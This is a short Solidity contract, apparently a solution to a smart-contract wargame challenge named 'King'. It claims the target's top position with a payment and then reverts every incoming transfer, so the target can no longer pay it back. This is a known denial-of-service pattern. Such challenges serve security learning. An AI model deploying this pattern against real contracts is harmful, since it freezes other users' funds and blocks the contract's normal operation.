// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IKing {
    function changeOwner(address _owner) external;
}

contract KingAttack {
    IKing public challenge;

    constructor(address challengeAddress) {
        challenge = IKing(challengeAddress);
    }

    function attack() external payable {
        payable(address(challenge)).call{value: msg.value}("");
    }

    receive() external payable {
        revert();
    }
}
